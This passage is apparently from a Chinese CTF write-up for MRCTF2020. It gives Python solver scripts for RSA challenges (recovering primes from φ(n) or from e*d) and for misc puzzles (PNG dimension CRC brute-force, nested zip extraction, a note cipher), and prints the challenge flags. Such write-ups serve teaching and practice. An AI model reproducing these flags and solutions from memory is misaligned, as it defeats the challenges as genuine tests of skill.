    p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

n <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        x<span class="token operator">=</span> n<span class="token operator">*</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        n<span class="token operator">=</span>x
phi<span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    phi <span class="token operator">*=</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span>

<span class="token comment">#print n</span>
<span class="token comment">#print sympy.nextprime(n)</span>
d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>factor<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span> p

Q_1 <span class="token operator">=</span> <span class="token number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span>
Q_2 <span class="token operator">=</span>  <span class="token number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span>
sub_Q <span class="token operator">=</span> <span class="token number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span>
Q <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>sub_Q<span class="token punctuation">,</span> Q_2<span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span>
q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span>
<span class="token keyword">print</span> q

c <span class="token operator">=</span> <span class="token number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span>

ph <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> ph<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span>

<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token comment"># flag：MRCTF&#123;sti11_@_b@by_qu3st10n&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h2><p>跟上一题相似，也是求p和q的</p>
<p>先看p：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_F_n = "</span><span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以知道这里已知的数有n = p <em> q和φ(n) = (p-1) </em> (q-1) ，这里就可以使用二分法来计算</p>
<p>然后是q：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>
    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_E_D = "</span><span class="token punctuation">,</span> e <span class="token operator">*</span> d<span class="token punctuation">)</span>
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相当于是已知e，d，n，借鉴了<a href="https://blog.csdn.net/qq_41956187/article/details/105189556?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-2">大佬的博客</a></p>
<p>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
<span class="token keyword">import</span> libnum
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">get_P</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># P_n = p * q</span>
    P_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span>
    <span class="token comment"># P_F_n = p*q - (p+q) + 1</span>
    P_F_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span>
    <span class="token comment"># P_Q = p+q</span>
    P_Q <span class="token operator">=</span> P_n <span class="token operator">-</span> P_F_n <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token comment">#print P_Q</span>

    l<span class="token operator">=</span>P_Q<span class="token operator">/</span><span class="token number">2</span>
    r<span class="token operator">=</span>P_Q

    <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r<span class="token punctuation">:</span>
      p<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>
      y<span class="token operator">=</span>p<span class="token operator">*</span><span class="token punctuation">(</span>P_Q<span class="token operator">-</span>p<span class="token punctuation">)</span>
      <span class="token keyword">if</span> y<span class="token operator">==</span>P_n<span class="token punctuation">:</span>
          <span class="token comment">#print p</span>
          <span class="token keyword">break</span>
      <span class="token keyword">if</span> y<span class="token operator">></span>P_n<span class="token punctuation">:</span>
          <span class="token comment">#print 'y>P_n'</span>
          l<span class="token operator">=</span>p
      <span class="token keyword">else</span><span class="token punctuation">:</span>
          <span class="token comment">#print 'y&lt;P_n'</span>
          r<span class="token operator">=</span>p
      
    <span class="token comment">#print 'done'</span>
    q<span class="token operator">=</span>P_Q<span class="token operator">-</span>p
    <span class="token comment">#print q</span>
    <span class="token keyword">if</span> p<span class="token operator">></span>q<span class="token punctuation">:</span>
        p<span class="token punctuation">,</span>q<span class="token operator">=</span>q<span class="token punctuation">,</span>p
        factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">get_Q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Q_n = p * q</span>
    Q_n <span class="token operator">=</span>  <span class="token number">20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span>
    <span class="token comment"># Q_E_D = e * d</span>
    Q_E_D <span class="token operator">=</span>  <span class="token number">100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span>
    f<span class="token punctuation">,</span> s<span class="token punctuation">,</span> tem <span class="token operator">=</span> Q_E_D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token keyword">while</span> f <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> f <span class="token operator">//</span> <span class="token number">2</span>
        s <span class="token operator">+=</span> <span class="token number">1</span>
    i<span class="token punctuation">,</span> a<span class="token punctuation">,</span> t <span class="token operator">=</span> s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> f
    b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>
    <span class="token keyword">while</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>

    <span class="token keyword">while</span> i <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>
        <span class="token keyword">if</span> c <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            b <span class="token operator">=</span> c
            i <span class="token operator">-=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> b <span class="token operator">==</span> Q_n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>
        <span class="token keyword">while</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
            b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>

    p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> Q_n<span class="token punctuation">)</span>
    q <span class="token operator">=</span> Q_n<span class="token operator">//</span>p
    
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>
    
p <span class="token operator">=</span> get_P<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> p
q <span class="token operator">=</span> get_Q<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> q
c <span class="token operator">=</span>  <span class="token number">40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token comment"># flag：MRCTF&#123;Ju3t_@_31mp13_que3t10n&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h2><p>打开压缩包，发现一文档，不知道把文档里的内容藏哪去了，直接解压文档，在document.xml中找到音符</p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线网站解密</a></p>
<p>flag：<code>MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</code></p>
<h2 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h2><p>图片显示问题，估计改了高，爆破一下，修改得到flag<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zlib
<span class="token keyword">import</span> struct

filename <span class="token operator">=</span> <span class="token string">'flag.png'</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    all_b <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    crc32key <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">4095</span>            <span class="token comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span>
    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#高和宽一起爆破</span>
        width <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">#q为8字节，i为4字节，h为2字节</span>
        <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            height <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>
                data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>
            crc32result <span class="token operator">=</span> zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"宽为："</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"高为："</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>flag:<code>MRCTF&#123;1ts_vEryyyyyy_ez!&#125;</code></p>
<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><p>将系统时间改成2020/09/17就行了</p>
<p>flag:<code>MRCTF&#123;We1cOm3_70_cyber_security&#125;</code></p>
<h2 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h2><p>直接拼图</p>
<p>flag：<code>MRCTF&#123;Why_4re_U_5o_ShuL1an??&#125;</code></p>
<p>(听说nb的大佬都是直接montage，但是我这种菜鸟不会用啊啊啊)</p>
<h2 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h2><p>直接上解压脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token punctuation">,</span>os 
<span class="token keyword">def</span> <span class="token function">unzip</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>zfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    file_path<span class="token operator">=</span>path<span class="token operator">+</span>os<span class="token punctuation">.</span>sep<span class="token operator">+</span>zfile
    desdir<span class="token operator">=</span>path
    <span class="token keyword">print</span><span class="token punctuation">(</span>desdir<span class="token punctuation">)</span>
    srcfile<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
    <span class="token keyword">for</span> filename <span class="token keyword">in</span> srcfile<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        srcfile<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>desdir<span class="token punctuation">,</span>pwd<span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>zfile<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># if zipfile.is_zipfile(filename):</span>
            path<span class="token operator">=</span>desdir
            zfile<span class="token operator">=</span>filename
            unzip<span class="token punctuation">(</span>path<span class="token punctuation">,</span>zfile<span class="token punctuation">)</span>

path<span class="token operator">=</span><span class="token string">"C:\\Users\\Admin\\Downloads\\[MRCTF2020]千层套路"</span>
zfile<span class="token operator">=</span><span class="token string">"0573.zip"</span>
unzip<span class="token punctuation">(</span>path<span class="token punctuation">,</span>zfile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后得到rgb</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
x<span class="token operator">=</span><span class="token number">200</span>
y<span class="token operator">=</span><span class="token number">200</span>
im<span class="token operator">=</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>
        line<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
	rgb<span class="token operator">=</span>line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span>
	<span class="token comment">#print rgb</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	    <span class="token keyword">continue</span>
